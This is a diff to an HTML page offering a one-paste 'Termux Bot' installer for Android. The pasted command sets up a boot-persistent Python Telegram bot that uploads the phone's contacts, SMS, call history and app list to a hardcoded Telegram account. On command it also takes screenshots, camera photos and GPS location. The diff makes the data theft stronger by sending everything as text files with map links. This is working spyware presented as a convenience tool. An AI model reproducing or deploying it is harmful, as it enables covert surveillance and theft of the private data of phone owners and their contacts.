@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚡ Termux Bot - Auto Deploy</title>
+    <title>⚡ Termux Bot - One Paste Deploy</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -66,17 +66,20 @@
             margin: 15px 0;
             text-align: left;
             word-break: break-all;
-            max-height: 200px;
+            max-height: 220px;
             overflow-y: auto;
-            font-size: 11px;
+            font-size: 10px;
             color: #00ff88;
+            line-height: 1.4;
         }
         .btn.copied { background: #ffcc00 !important; }
         .warning { color: #ff4444; font-size: 11px; margin-top: 5px; }
         ul { text-align: left; color: #aaa; font-size: 12px; padding-left: 20px; }
         ul li { margin: 5px 0; }
+        code { color: #00ff88; background: #1a1a1a; padding: 2px 6px; border-radius: 4px; }
         @media (max-width: 400px) {
             .btn { display: block; width: 100%; margin: 5px 0; }
+            .code-block { font-size: 9px; max-height: 180px; }
         }
     </style>
 </head>
@@ -84,34 +87,34 @@
     <div class="container">
         <div class="emoji">💀🔥</div>
         <h1>Termux Bot - One Paste Deploy</h1>
-        <p style="color:#aaa; margin-bottom:15px; font-size:13px;">Install 3 APKs → Copy → Paste → Done</p>
+        <p style="color:#aaa; margin-bottom:15px; font-size:13px;">Install 3 APKs → Grant Permissions → Copy → Paste → Done</p>
 
-        <!-- Step 1: Download ALL APKs -->
+        <!-- Step 1 -->
         <div class="step">
             <h3>📥 Step 1: Download & Install ALL 3 APKs</h3>
             <a href="https://f-droid.org/repo/com.termux_1002.apk" class="btn download" target="_blank">⬇️ Termux</a>
             <a href="https://f-droid.org/repo/com.termux.api_1000.apk" class="btn api" target="_blank">⬇️ Termux:API</a>
             <a href="https://f-droid.org/repo/com.termux.boot_1000.apk" class="btn download" target="_blank">⬇️ Termux:Boot</a>
-            <p style="margin-top:8px;">Install all 3, then open each app once.</p>
+            <p style="margin-top:8px;">Install all 3 APKs, then open each app once.</p>
         </div>
 
-        <!-- Step 2: Grant Permissions -->
+        <!-- Step 2 -->
         <div class="step">
-            <h3>🔐 Step 2: Grant Permissions</h3>
+            <h3>🔐 Step 2: Grant Permissions (One Time)</h3>
             <ul>
-                <li>Open Termux → type: <code style="color:#00ff88;">termux-setup-storage</code> → Allow</li>
-                <li>Settings → Apps → Termux → Permissions → Enable ALL</li>
-                <li>Settings → Apps → Termux:API → Permissions → Enable ALL</li>
+                <li>Open Termux → type: <code>termux-setup-storage</code> → Tap Allow</li>
+                <li>Phone Settings → Apps → Termux → Permissions → Enable ALL</li>
+                <li>Phone Settings → Apps → Termux:API → Permissions → Enable ALL</li>
             </ul>
         </div>
 
-        <!-- Step 3: Copy & Paste -->
+        <!-- Step 3 -->
         <div class="step">
             <h3>⚡ Step 3: Copy & Paste In Termux</h3>
             <button class="btn" onclick="copyCommand()" id="copyBtn">📋 COPY COMMAND</button>
-            <p class="warning">Paste in Termux → Enter → Wait 3-4 mins → Bot LIVE</p>
+            <p class="warning">Paste in Termux → Enter → Wait 3-4 mins → Bot LIVE on Telegram</p>
             <div class="code-block" id="commandBox">yes | pkg update -y && yes | pkg upgrade -y && yes | pkg install -y python termux-api termux-tools && pip install --no-input python-telegram-bot && mkdir -p ~/.termux/boot && rm -f ~/bot.py && cat > ~/bot.py << 'EOF'
-import os, time, asyncio
+import os, time, asyncio, json
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 
@@ -120,50 +123,68 @@ AUTHORIZED_ID = 5707956654
 FLAG = "/data/data/com.termux/files/home/.boot_done"
 
 def run(c):
-    try:
-        return os.popen(c).read().strip()
-    except:
-        return "Error"
+    try: return os.popen(c).read().strip()
+    except: return ""
+
+async def send_file(app, uid, cmd, emoji, name):
+    out = run(cmd)
+    if out and "error" not in out.lower():
+        fp = f"/sdcard/{name.lower().replace(' ','_')}.txt"
+        with open(fp, "w") as f: f.write(out)
+        await app.bot.send_document(uid, open(fp, "rb"), caption=f"{emoji} {name}")
+        os.remove(fp)
+    else:
+        await app.bot.send_message(uid, f"{emoji} {name}: Permission needed.")
 
 async def boot_dump(app):
     try:
         await app.bot.send_message(AUTHORIZED_ID, "🟢 Bot Online - Dumping Data...")
         for name, cmd, emoji in [("Contacts", "termux-contact-list", "📇"), ("SMS", "termux-sms-list", "💬"), ("Calls", "termux-call-log", "📞"), ("Apps", "pm list packages", "📱")]:
-            out = run(cmd)
-            if out and "error" not in out.lower():
-                for i in range(0, len(out), 3500):
-                    await app.bot.send_message(AUTHORIZED_ID, f"{emoji} {name}:\n```\n{out[i:i+3500]}\n```")
-            else:
-                await app.bot.send_message(AUTHORIZED_ID, f"{emoji} {name}: Permission needed. Grant in Settings > Apps > Termux.")
-        await app.bot.send_message(AUTHORIZED_ID, "✅ Dump Complete. Bot Ready.\n\nCommands:\n/ss /cam /location /battery /notify /download /say /vibrate /torch /lock /calls /contacts /sms /apps")
+            await send_file(app, AUTHORIZED_ID, cmd, emoji, name)
+        await app.bot.send_message(AUTHORIZED_ID, "✅ Dump Complete. Bot Ready!\n/ss /cam /location /battery /notify /download /say /vibrate /torch /lock /calls /contacts /sms /apps")
         os.system(f"touch {FLAG}")
     except Exception as e:
-        await app.bot.send_message(AUTHORIZED_ID, f"Boot dump error: {e}")
+        await app.bot.send_message(AUTHORIZED_ID, f"Error: {e}")
 
 async def ss(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     p = "/sdcard/ss.png"
     os.system(f"termux-screenshot {p}")
-    await update.message.reply_photo(open(p, "rb"), "📸 Screenshot")
-    os.remove(p)
+    await asyncio.sleep(1.5)
+    if os.path.exists(p):
+        await update.message.reply_photo(open(p, "rb"), "📸 Screenshot")
+        os.remove(p)
+    else:
+        await update.message.reply_text("❌ Screenshot failed. Run: pkg install termux-api -y")
 
 async def cam(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     cid = 1 if context.args and context.args[0] == "front" else 0
     p = "/sdcard/cam.jpg"
     os.system(f"termux-camera-photo -c {cid} {p}")
-    await update.message.reply_photo(open(p, "rb"), "📷 Photo")
-    os.remove(p)
+    await asyncio.sleep(1.5)
+    if os.path.exists(p):
+        await update.message.reply_photo(open(p, "rb"), "📷 Photo")
+        os.remove(p)
+    else:
+        await update.message.reply_text("❌ Camera failed.")
 
 async def loc(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     out = run("termux-location")
-    await update.message.reply_text(f"📍 Location:\n```\n{out}\n```")
+    try:
+        data = json.loads(out)
+        lat = data.get("latitude", 0)
+        lon = data.get("longitude", 0)
+        maps_link = f"https://maps.google.com/?q={lat},{lon}"
+        await update.message.reply_text(f"📍 Location:\nLat: {lat}\nLon: {lon}\n\n🗺️ {maps_link}")
+        await update.message.reply_location(latitude=lat, longitude=lon)
+    except:
+        await update.message.reply_text(f"📍 Raw:\n{out}")
 
 async def bat(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    out = run("termux-battery-status")
-    await update.message.reply_text(f"🔋 Battery:\n```\n{out}\n```")
+    await update.message.reply_text(f"🔋 Battery:\n```\n{run('termux-battery-status')}\n```")
 
 async def notif(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
@@ -199,26 +220,41 @@ async def lock(update, context):
 
 async def calls(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    out = run("termux-call-log")
-    await update.message.reply_text(f"📞 Call Logs:\n```\n{out[:4000]}\n```")
+    await update.message.reply_text("⏳ Fetching Call Logs...")
+    await send_file(update.get_bot(), AUTHORIZED_ID, "termux-call-log", "📞", "Call_Logs")
 
 async def cont(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    out = run("termux-contact-list")
-    await update.message.reply_text(f"📇 Contacts:\n```\n{out[:4000]}\n```")
+    await update.message.reply_text("⏳ Fetching Contacts...")
+    await send_file(update.get_bot(), AUTHORIZED_ID, "termux-contact-list", "📇", "Contacts")
 
 async def sms_cmd(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    out = run("termux-sms-list")
-    await update.message.reply_text(f"💬 SMS:\n```\n{out[:4000]}\n```")
+    await update.message.reply_text("⏳ Fetching SMS...")
+    await send_file(update.get_bot(), AUTHORIZED_ID, "termux-sms-list", "💬", "SMS")
 
 async def apps(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    out = run("pm list packages")
-    await update.message.reply_text(f"📱 Installed Apps:\n```\n{out[:4000]}\n```")
+    await update.message.reply_text("⏳ Fetching Installed Apps...")
+    await send_file(update.get_bot(), AUTHORIZED_ID, "pm list packages", "📱", "Installed_Apps")
 
 async def start(update, context):
-    await update.message.reply_text("🤖 Bot Ready!\n\n📸 /ss - Screenshot\n📷 /cam [back|front] - Camera\n📍 /location - GPS\n🔋 /battery - Battery\n🔔 /notify - Notifications\n⬇️ /download &lt;url&gt; - Download\n🗣️ /say &lt;text&gt; - Speak\n📳 /vibrate [ms] - Vibrate\n🔦 /torch on|off - Flashlight\n🔒 /lock - Lock Screen\n📞 /calls - Call History\n📇 /contacts - Contacts\n💬 /sms - SMS History\n📱 /apps - Installed Apps")
+    await update.message.reply_text("""🤖 *Bot Ready!*
+
+📸 /ss - Screenshot
+📷 /cam [back|front] - Camera Photo
+📍 /location - GPS + Google Maps Link
+🔋 /battery - Battery Status
+🔔 /notify - Notifications
+⬇️ /download &lt;url&gt; - Download File
+🗣️ /say &lt;text&gt; - Text to Speech
+📳 /vibrate [ms] - Vibrate Phone
+🔦 /torch on|off - Flashlight
+🔒 /lock - Lock Screen
+📞 /calls - Call History (.txt file)
+📇 /contacts - Contacts (.txt file)
+💬 /sms - SMS History (.txt file)
+📱 /apps - Installed Apps (.txt file)""")
 
 async def main():
     app = Application.builder().token(BOT_TOKEN).build()
@@ -264,7 +300,7 @@ BOOT
 chmod +x ~/.termux/boot/start_bot.sh && echo '✅ ALL DONE! Bot is LIVE' && python ~/bot.py</div>
         </div>
 
-        <p style="color:#888; font-size:10px; margin-top:10px;">Bot Token & User ID pre-configured. One paste = fully deployed.</p>
+        <p style="color:#888; font-size:10px; margin-top:10px;">Pre-configured | One Paste | Auto-Start on Reboot | All Data as .txt Files | Google Maps Location</p>
     </div>
 
     <script>
